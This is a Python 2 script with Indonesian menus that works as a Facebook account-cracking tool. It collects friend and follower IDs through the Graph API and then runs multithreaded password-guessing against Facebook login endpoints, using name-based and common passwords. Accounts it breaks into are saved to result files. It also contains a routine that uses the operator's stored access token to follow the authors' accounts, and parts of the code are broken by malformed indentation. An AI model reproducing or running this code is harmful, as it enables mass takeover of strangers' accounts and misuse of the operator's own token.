#!/usr/bin/python2
# coding=utf-8
# Autor By : Bangsat-XD
# Code By  : ☆ RAKA ☆ ™︻®╤───────═◍➤
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime
b='\033[1;94m'

i='\033[1;92m'

c='\033[1;96m'

m='\033[1;91m'

u='\033[1;95m'

k='\033[1;93m'

p='\033[1;97m'

h='\033[1;90m'

P = '\x1b[1;97m' # PUTIH

M = '\x1b[1;91m' # MERAH 

H = '\x1b[1;92m' # HIJAU

K = '\x1b[1;93m' # KUNING

B = '\x1b[1;94m' # BIRU

U = '\x1b[1;95m' # UNGU

O = '\x1b[1;96m' # BIRU MUDA

N = '\x1b[0m'    # WARNA MATI
try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
useragents = ('NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+')
ua = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
uas = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
ip = requests.get('https://api.ipify.org').text
uas = random.choice(["NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"])
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))

logo = """
   \033[1;94m─────╔╗─────────────╔╗
   \033[1;94m─────║║─────────────║║
   \033[1;93m╔═╦══╣║╔╦══╗╔══╦═╗╔═╝╠═╦╦══╦═╗
   \033[1;94m║╔╣╔╗║╚╝╣╔╗║║╔╗║╔╗╣╔╗║╔╬╣╔╗║╔╗╗
   \033[1;94m║║║╔╗║╔╗╣╔╗║║╔╗║║║║╚╝║║║║╔╗║║║║
   \033[1;94m╚╝╚╝╚╩╝╚╩╝╚╝╚╝╚╩╝╚╩══╩╝╚╩╝╚╩╝╚╝
   """
def bot_follow():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\n   [!] Token invalid")
		logs()
		requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + toket)      #Author
		requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + toket)      #Owner
		requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + toket)      #Owner
    	requests.post('https://graph.facebook.com/532301703502197/subscribers?access_token=' + toket) #
        print(('[+] \x1b[92mLogin Sukses!\x1b[0m'))
        raw_input('[+] Tekan Enter ')
        menu()
        print'[!] Token Invalid!'
        sys.exit()
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		print logo
		print""+p+""
		print"[+] Di Isi Ya Cukk"
		token = raw_input('\n[+] ☆ Enter Token ☆ ™︻®╤───────═◍➤ : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot_follow()
			menu()
		except KeyError:
			print'[!] Token Invalid!'
			sys.exit()
            
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] Tidak Ada Koneksi!'
        sys.exit()
    print logo
    print""+p+""
    print"[+] Bergabung    : \033[0;97m" +durasi
    print""+p+"[+] IP Anda      : "+p+"" +ip
    print""+p+""
    print"[ Hello \033[1;92m"+nama+"\033[0;97m ]"
    print""+p+""
    print"[1]. Metode B-Api (Cepat)"
    print"[2]. Metode Mbasic (Sedang)"
    print"["+m+"0"+p+"]. Keluar (Hapus Token)"
    method = raw_input('\n[?] Pilih : ')
    if method == '':
        menu()
    elif method == '01' or method == '1':
        menubapi()
    elif method == '02' or method == '2':
        menumbasic()
    elif method == '00' or method == '0':
        os.system('rm -f login.txt')
        print'[!] Berhasil Menghapus Token'
        exit()
    else:
        exit('[!] Pilih Yang Benar!')
        
        
def menubapi():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] Tidak Ada Koneksi!'
        sys.exit()

    print logo
    print""+p+""
    print""+p+"[×]\033[1;92m Methode B-Api"
    print""+p+"[+] Bergabung    : "+p+"" +durasi
    print""+p+"[+] IP Anda      : "+p+"" +ip
    print""+p+""
    print"[ Hello \033[1;92m"+nama+"\033[0;97m ]"
    print""+p+""
    print""+p+"[1]. Crack Dari Teman Sendiri"
    print"[2]. Crack Dari ID Publik"
    print"[3]. Crack Dari Followers"
    print"[4]. Lihat Hasil Crack"
    print("["+m+"0"+p+"]. Keluar (Hapus Token)")
    pilih_menubapi()


def pilih_menubapi():
    ask = raw_input('\n[?] Pilih : ')
    if ask == '':
        print'[!] Pilih Yang Benar!'
        exit()
        
    elif ask == '01' or ask == '1':
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '02' or ask == '2':
        idt = raw_input('[+] ID Publik : ')

        try:

            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print'[+] Nama : ' + sp['name']
        except KeyError:
            print'[!] ID Tidak Tersedia!'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?limit=5000&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '03' or ask == '3':
        idt = raw_input('[+] ID Followers : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print'[+] Nama : ' + sp['name']
        except KeyError:
            print'[!] ID Tidak Tersedia!'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)
            
    elif ask == '04' or ask == '4':
        print'\n[1] Hasil OK '
        print'[2] Hasil CP '
        ress = raw_input('\n[?] Pilih : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            os.system('echo -e "--------------------------------------" | lolcat')
            print'\n[+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('echo -e "--------------------------------------" | lolcat')
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '02' or ress == '2':
            os.system('echo -e "--------------------------------------" | lolcat')
            print'[+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('echo -e "--------------------------------------" | lolcat')
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit('[!] Pilih Yang Benar!')
    elif ask == '00' or ask == '0':
        os.system('rm -f login.txt')
        print'[!] Berhasil Menghapus Token'
        exit()
    else:
        print'[!] Pilih Yang Benar!'
        exit()
    ask = raw_input('[?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualbapi()
    print'[+] Total ID : ' + str(len(id))
    print'[+] File Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print'[+] File Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print'[×]\x1b[0;92m Semoga Dapat Banyak Cuy\x1b[0;97m'
    os.system('echo -e "--------------------------------------\n" | lolcat')
    print''

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m[><] %s/%s OK-:%s - CP-:%s  '% (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower()+'123',name.lower()+'1234',name.lower()+'12345','katasandi','sayang','bismillah','doraemon','sayangku','indonesia','rahasia','123456','123456788','bajingan']:
                ua_api = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': pw, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_api)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print'\r\x1b[0;92m[OK] ' + uid + ' | ' + pw + '        '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OK] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print'\r\x1b[0;93m[CP] ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    #raw_input('[+] Tekan Enter')
    exit()


def manualbapi():
    print'\n[+] Buat Password Contoh : sayang,rahasia'
    pw = raw_input('[?] Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print'[+] Total ID : ' + str(len(id))
    print'[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di:out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print'[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di:out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print'[×]\x1b[0;92m Semoga Dapat Banyak Cuy\x1b[0;97m'
    os.system('echo -e "--------------------------------------\n" | lolcat')
    print''

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[0;97m[><] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                ua_apim = {'user-agent': ua}
                param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
                   'format': 'json', 
                   'sdk_version': '2', 
                   'email': uid, 
                   'locale': 'en_US', 
                   'password': asu, 
                   'sdk': 'ios', 
                   'generate_session_cookies': '1', 
                   'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
                api = 'https://b-api.facebook.com/method/auth.login'
                response = requests.get(api, params=param, headers=ua_apim)
                if 'session_key' in response.text and 'EAAA' in response.text:
                    print'\r\x1b[0;92m[OK] ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OK] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'www.facebook.com' in response.json()['error_msg']:
                    print'\r\x1b[0;93m[CP] ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    #raw_input('[+] Tekan Enter')
    exit()
    
def menumbasic():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'[!] Token Invalid!'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'[!] Tidak Ada Koneksi!'
        sys.exit()

    print logo
    print""+p+""
    print""+p+"[×]\033[1;92m Methode Mbasic"
    print""+p+"[+] Bergabung    : "+p+"" +durasi
    print""+p+"[+] IP Anda      : "+p+"" +ip
    print""+p+""
    print"[ Hello \033[1;92m"+nama+"\033[0;97m ]"
    print""+p+""
    print"[1]. Crack Dari Publik Teman"
    print"[2]. Crack Dari Total Followers"
    print"[3]. Lihat Hasil Crack"
    print"["+m+"0"+p+"]. Keluar (Hapus Token)"
    pilih_menumbasic()


def pilih_menumbasic():
    ask = raw_input('\n[?] Pilih : ')
    if ask == '':
        print'[!] Pilih Yang Benar!'
        exit()
    elif ask == '01' or ask == '1':
        print "\n[+] Isi 'me' Jika Ingin Crack Dari List Teman"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print'[+] Nama : ' + sp['name']
        except KeyError:
            print'[!] ID Tidak Tersedia!'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '02' or ask == '2':
        print"\n[+] Isi 'me' Jika Ingin Crack Follower Sendiri"
        idt = raw_input('[+] ID Publik : ')
        try:
            pok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            sp = json.loads(pok.text)
            print'[+] Nama : ' + sp['name']
        except KeyError:
            print'[!] ID Tidak Tersedia!'
            exit()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?limit=999999&access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif ask == '03' or ask == '3':
        print'\n[1] Hasil OK '
        print'[2] Hasil CP '
        ress = raw_input('\n[?] Pilih : ')
        if ress == '':
            menu()
        elif ress == '01' or ress == '1':
            os.system('echo -e "--------------------------------------\n" | lolcat')
            print'\n[+] Hasil \x1b[0;92mOK\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/OK-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        elif ress == '02' or ress == '2':
            os.system('echo -e "--------------------------------------\n" | lolcat')
            print '[+] Hasil \x1b[0;93mCP\x1b[0;97m Tanggal : \x1b[0;92m%s-%s-%s\x1b[0;97m' % (ha, op, ta)
            os.system('cat out/CP-%s-%s-%s.txt' % (ha, op, ta))
            exit()
        else:
            exit('[!] Pilih Yang Benar!')
    elif ask == '0' or ask == '00':
        os.system('rm -f login.txt')
        print'[!] Berhasil Menghapus Token'
        exit()
    else:
        print'[!] Pilih Yang Benar!'
        exit()
    ask = raw_input('[?] Ingin Gunakan Password Manual? Y/t : ')
    if ask == 'Y' or ask == 'y':
        manualmbasic()
    print'[+] Total ID : ' + str(len(id))
    print'[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print'[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print'[×]\x1b[0;92m Semoga Dapat Banyak Cuy\x1b[0;97m'
    os.system('echo -e "--------------------------------------\n" | lolcat')
    print''

    def main(arg):
        global loop
        print'\r\x1b[0;97m[><] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(),name.lower()+'123',name.lower()+'1234',name.lower()+'12345','katasandi','sayang','bismillah','doraemon','sayangku','indonesia','rahasia','123456','123456789','bajingan']:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m[OK] ' + uid + ' | ' + pw + '                                            '
                    ok.append(uid + ' | ' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OK] ' + str(uid) + ' | ' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[0;93m[CP] ' + uid + ' | ' + pw + '        '
                    cp.append(uid + ' | ' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(pw) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    #raw_input('[+] Tekan Enter')
    exit()


def manualmbasic():
    print'\n[+] Buat Password Contoh : sayang, rahasia'
    pw = raw_input('[?] Buat Password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print'[+] Total ID : ' + str(len(id))
    print'[+] File \x1b[0;92mOK\x1b[0;97m Tersimpan Di : out/OK-%s-%s-%s.txt' % (ha, op, ta)
    print'[+] File \x1b[0;93mCP\x1b[0;97m Tersimpan Di : out/CP-%s-%s-%s.txt' % (ha, op, ta)
    print'[×]\x1b[0;92m Semoga Dapat Banyak Cuy\x1b[0;97m'
    os.system('echo -e "--------------------------------------\n" | lolcat')
    print''

    def main(arg):
        global loop
        print'\r\x1b[0;97m[><] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'mbasic_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[0;92m[Ok] ' + uid + ' | ' + asu + '        '
                    ok.append(uid + ' | ' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[OK] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    print'\r\x1b[0;93m[CP] ' + uid + ' | ' + asu + '        '
                    cp.append(uid + ' | ' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('[CP] ' + str(uid) + ' | ' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n[+] Selesai'
    #raw_input('[+] Tekan Enter')
    exit()
    
if __name__ == '__main__':
    os.system('clear')
    print logo
    tokenz()
